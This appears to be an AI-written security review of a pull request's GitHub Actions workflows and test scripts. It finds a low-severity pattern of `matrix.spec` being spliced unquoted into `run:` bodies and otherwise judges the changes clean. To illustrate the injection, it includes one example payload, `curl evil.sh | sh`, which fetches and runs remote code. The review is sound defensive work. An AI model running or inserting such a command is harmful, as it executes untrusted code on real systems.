# Security review — e2e-suite-review

Dimension covered: **security only** (correctness, readability and
architecture are other reviewers' rows). Scope: every file PR #164
(`8368b2f`) merged, as it stands at this piece's tip (`ee8e145`) — this
piece's own diff over `8368b2f...HEAD` touches only `CLAUDE.md` and
`openspec/`, no code, so there was nothing of this piece's own to review on
top of #164.

Files read in full: `.github/workflows/ui-tests.yml`; `.github/workflows/ci.yml`'s
`ui-specs` job and #164's other hunks (`git show 8368b2f -- .github/workflows/ci.yml`);
`dialectica-ui/src/qml/Main.qml`'s five root handles and `tst_e2e_handles.qml`;
`adjudicate-ui-run.sh`, `tst_adjudicate_ui_run.sh`, `require-jq-yq.sh`,
`tst_ui_tool_pins.sh`, `tst_scaffold_values_unchanged.sh`; `ui/join.yaml` and
`validate-ui-specs.mjs`; `check_qml_reachable.py`'s diff (confirmed docstring-only
via `git diff 767be15 8368b2f -- dialectica-ui/tests/check_qml_reachable.py`).

## Finding

- [ ] **`dev-writer`** — `.github/workflows/ui-tests.yml:353-354,371` — `${{ matrix.spec }}`
      is spliced directly into three `run:` script bodies instead of going
      through an env-var indirection, unlike every other use of the same
      context value in this file.
      **Scenario:** the same file sets `env: SPEC: dialectica-ui/tests/ui/${{ matrix.spec }}.yaml`
      at job level (line 69) and `env: JOB_TOTAL: ${{ strategy.job-total }}`
      (line ~112) — both the GitHub-recommended pattern, because an `env:`
      value is passed to the shell as a real environment variable, not
      string-substituted into the script text. Lines 353-354
      (`--json "ui-results/${{ matrix.spec }}.json"`, `--junit "ui-results/${{ matrix.spec }}.xml"`)
      and line 371 (`"ui-results/${{ matrix.spec }}.json" "$SPEC"`) instead put
      `${{ matrix.spec }}` straight into the `run: |` body, where the Actions
      runner replaces the expression with its literal string *before* the
      shell parses the script. Any matrix value containing shell metacharacters
      (e.g. `` join`; curl evil.sh | sh` `` as a matrix entry) would execute as
      part of the command rather than being treated as one filename token.
      **Severity: low, not a fix-before-merge blocker.** `matrix.spec` is
      currently the hardcoded literal `join` (`strategy.matrix.spec: [join]`,
      the "ONE HAND-MAINTAINED LIST" the job's own comment names), so nothing
      today supplies an attacker-controlled value there — and a PR from a fork
      that wanted to inject a value would have to edit `ui-tests.yml` itself to
      do it, at which point it can already add an arbitrary `run:` step
      directly with no injection trick needed. Both workflows are on
      `pull_request` (not `pull_request_target`) with top-level
      `permissions: contents: read` and reference no `secrets.*` in either new
      job, so a fork PR run has nothing to steal via this or any other path
      inside these two files — confirmed by reading both workflows' `on:`,
      `permissions:` and every `env:`/`run:` block; no `secrets.` context
      appears anywhere in the `ui-specs` or `spec`/matrix jobs.
      **Why it is still worth fixing:** it is an inconsistency against the
      file's own established mitigation (used correctly twice in the same
      job), and the risk model changes the moment the matrix stops being a
      hand-typed single-element list — the exact failure mode
      `tst_ui_tool_pins.sh` and the "every spec in the tree is in the matrix"
      step both exist to guard against elsewhere in this file. Fix: derive a
      `RESULT_PATH: ui-results/${{ matrix.spec }}` (or similar) job/step `env:`
      value once and reference `$RESULT_PATH.json` / `$RESULT_PATH.xml` /
      `$RESULT_PATH` in the three `run:` bodies instead.
      **Measured:** not exploitable today (verified by reading both workflows'
      full trigger/permissions/secrets surface); this is a pattern finding, not
      a reproduced exploit — no CI run demonstrates impact, and none is needed
      to see the anti-pattern.

## Clean

- **Workflow triggers and permissions.** Both `ci.yml` and `ui-tests.yml` use
  `on: pull_request` (never `pull_request_target` or `workflow_run`), so a
  fork PR runs with a read-only, secret-less token and the workflow file used
  is the PR's own. Top-level `permissions: contents: read` is explicit in both
  (not inherited from a repo default — `ci.yml`'s own comment gives the reason:
  a flipped repo default would otherwise hand a token that can push and mint
  releases to every job that runs third-party code). Neither new job
  (`ui-specs` in `ci.yml`, `spec` in `ui-tests.yml`) references `secrets.*` or
  requests a broader permission.
- **Supply chain / pinning.** `sitometres` and `yaml` are both pinned to exact
  versions (`@paradoxcomputer/sitometres@0.1.2`, `yaml@2.9.0`) in both the
  cheap (`ui-specs`) and expensive (`spec`) jobs, and `tst_ui_tool_pins.sh`
  fails CI if the two copies of the sitometres/lgs pins ever diverge or either
  stops being an exact version — including the case of a version written
  directly into a `run:` body, bypassing the compared `env:` value. This
  closes the exact gap #164's own security review found and fixed
  mid-PR (the earlier unpinned `yaml`/`pyyaml` install, per the merge commit's
  own log). `python3-yaml`/`pyyaml` are gone entirely; the only Python file in
  scope (`check_qml_reachable.py`) reads QML, confirmed unchanged except its
  docstring across the #164 merge. Third-party GitHub Actions
  (`cachix/install-nix-action`, `nix-community/cache-nix-action`) are
  SHA-pinned with a version comment; first-party `actions/*` actions are
  pinned to a major-version tag only, consistently with the rest of the repo's
  existing convention (not something #164 introduced) and with the file's own
  comment stating the SHA-pinning discipline is for third-party actions.
  `npm install`/`npx` run with no `--ignore-scripts`, so a compromised
  transitive dependency's install script would still run — a generic Node-CI
  risk this PR did not introduce and did not make worse; noted, not filed as a
  box, because fixing it is a repo-wide policy question, not specific to this
  code.
- **apt sources handling.** Both "install yq" steps move aside third-party apt
  sources by pattern (keeping only `ubuntu.sources`/`ubuntu.list`) before
  `apt-get update`, install only Ubuntu-archive packages, and tolerate
  `update` failing while treating `install` as the real gate. No third-party
  repository is added.
- **Shell injection in the new `.sh` scripts.** Read `adjudicate-ui-run.sh`,
  `require-jq-yq.sh`, `tst_adjudicate_ui_run.sh`, `tst_ui_tool_pins.sh` and
  `tst_scaffold_values_unchanged.sh` end to end. All `jq`/`yq`-derived values
  used in shell (`$count`, `$expected`, `$failed`, `$pin`, `$bin`, `$root`,
  `$logs`) are used inside quoted `"..."` expansions or `[ ... ]` tests, never
  concatenated into a string that is later `eval`'d or executed, and never
  handed to `printf` as the *format* argument (`printf '%s' "$problems"`, not
  `printf "$problems"` — the latter would be a format-string bug; the scripts
  correctly avoid it). `adjudicate-ui-run.sh`'s step-count comparison is
  written `[ "$count" -eq "$expected" ] || problem ...` specifically so a
  non-numeric value fails closed (`[` exits 2, which is `||`'s "true" branch,
  i.e. reported as a problem) rather than open — the script's own comment
  documents this was measured. No script here reads network-attacker-supplied
  bytes directly; all consume CI-local files (the sitometres JSON report,
  `scaffold.toml`, the workflow YAML) that a fork PR can only reach by editing
  the repo it already fully controls in its own branch.
- **`Main.qml`'s five new root handles** (`listReadState`, `stoaCount`,
  `pasteFailure`, `joinState`, `joinFailure`, `Main.qml:129-133`) are all
  `readonly property`, each a projection of state a screen already owns (no
  second, independently-writable copy), and deliberately carry no key or
  identity handle — confirmed by reading the surrounding comment block and
  `tst_e2e_handles.qml`'s fixtures, which pin each one against a
  null-implementation (constant-value) failure. A sitometres `state:`
  expression can only *read* these; QML's own `readonly` enforcement means an
  assignment attempt throws rather than mutating app state through the
  inspector.
- **`join.yaml`** is a fixed, repo-authored spec (not built from any runtime
  or peer-supplied input) and asserts presence/absence and failure-non-emptiness
  rather than pinning the wording of any core-supplied message, so a future
  reworded diagnostic cannot pass this spec for the wrong reason and no
  message content is echoed anywhere that would leak internal detail to a
  reader who shouldn't see it (this spec runs in CI only).
- **`validate-ui-specs.mjs`** reads only files in `dialectica-ui/tests/ui/`
  (a fixed, repo-controlled directory) via `readdirSync`, fails closed on an
  empty directory, and does not evaluate or execute anything from the parsed
  YAML beyond schema validation.

## Note to the runner (process, not a security finding)

This worktree's HEAD was forked at `8368b2f` (PR #164's merge commit, the
piece's *parent*), not at the piece branch's actual tip. `openspec/changes/e2e-suite-review/`
did not exist at that HEAD — `git ls-files` returned nothing for it — so the
proposal/design/tasks this brief asked me to read were absent until I
fast-forwarded this branch to `piece/134-e2e-suite-review`'s tip (`ee8e145`)
with `git merge --ff-only ee8e145` (a pure ref move; `8368b2f` was already an
ancestor, confirmed with `git merge-base --is-ancestor`, and the merge added
no code, only the missing `openspec/` and `CLAUDE.md` files). Worth checking
whether the other parallel reviewers on this piece hit the same stale base.
